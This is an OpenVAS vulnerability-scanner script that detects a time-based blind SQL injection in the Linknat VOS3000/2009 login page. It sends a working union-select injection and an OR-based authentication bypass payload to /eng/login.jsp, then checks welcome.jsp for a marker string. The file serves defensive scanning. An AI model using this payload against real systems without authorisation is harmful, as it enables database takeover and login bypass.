###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_linknat_vos_sql_inj.nasl 11449 2018-09-18 10:04:42Z mmartin $
#
# Linknat VOS3000/2009 SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:linknat:vos';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106085");
  script_version("$Revision: 11449 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-05-25 12:52:24 +0700 (Wed, 25 May 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Linknat VOS3000/2009 SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_linknat_vos_detect_http.nasl");
  script_mandatory_keys("linknat_vos/detected");

  script_tag(name:"summary", value:"Linknat VOS3000/2009 is prone to an SQL Injection vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"A time-based blind SQL-Injection has been found in the login page.
  Results can be gathered from the output of welcome.jsp during the same session.");

  script_tag(name:"impact", value:"A remote attacker can gain access to the underlying database and
  manipulate it with DBA privileges.");

  script_tag(name:"affected", value:"Version 2.1.1.5, 2.1.1.8 and 2.1.2.0");

  script_tag(name:"solution", value:"Upgrade to version 2.1.2.4 or later");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/May/57");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_app_port(cpe: CPE, service: 'www');
if( !port)
  exit(0);

host = http_host_name(port: port);

data = "loginType=1&name='+union+select+1,2,3,0x53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";

req = http_post_req(port: port, url: "/eng/login.jsp", data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

cookie = eregmatch(string: res, pattern: "Set-Cookie: (JSESSIONID=[0-9a-z]+);", icase: TRUE);
if (!cookie)
  exit(0);

cookie = cookie[1];

if (http_vuln_check(port: port, url: '/eng/welcome.jsp', pattern: 'SQL-Injection-Test',
                    cookie: cookie)) {
  security_message(port: port);
  exit(0);
}

exit(0);
